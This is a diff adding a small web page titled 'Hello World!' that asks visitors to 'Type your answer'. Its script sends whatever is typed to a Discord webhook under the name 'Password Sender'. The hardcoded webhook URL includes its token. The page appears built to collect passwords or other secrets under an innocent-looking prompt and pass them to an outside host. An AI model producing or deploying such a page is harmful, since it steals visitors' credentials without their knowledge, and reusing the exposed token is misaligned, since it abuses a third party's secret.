@@ -1,0 +1,41 @@
+<!DOCTYPE html>
+<html lang="en">
+  <head>
+    <meta charset="utf-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1" />
+    <link rel="icon" href="https://glitch.com/favicon.ico" />
+    <title>Hello World!</title>
+    <link rel="stylesheet" href="/style.css" />
+    <script src="/script.js" defer></script>
+  </head>
+  <body>
+    <text>Type your answer</text><br>
+    <textarea id="inputfield"></textarea>
+    <br>
+    <input type="submit" id="submitted" value="Submit" onclick="getVal()">
+  </body>
+</html>
+
+
+<script>
+  function getVal() {
+    var text = document.getElementById("inputfield").value;
+    console.log(text);
+
+    const request = new XMLHttpRequest();
+
+    request.open("POST", "https://discord.com/api/webhooks/1336395875236188226/5ybayeyG_WY6iYUFYfCkymi_zIsSZTKAxMEyDxwfihjbecqI_Z2AZ6zCYHI9GyQ0i-OY");
+
+    request.setRequestHeader('Content-type', 'application/json');
+
+    var params = {
+      username: "Password Sender",
+      avatar_url: "",
+      content: String(text)
+    }
+
+    request.send(JSON.stringify(params));
+}
+  
+  
+</script>
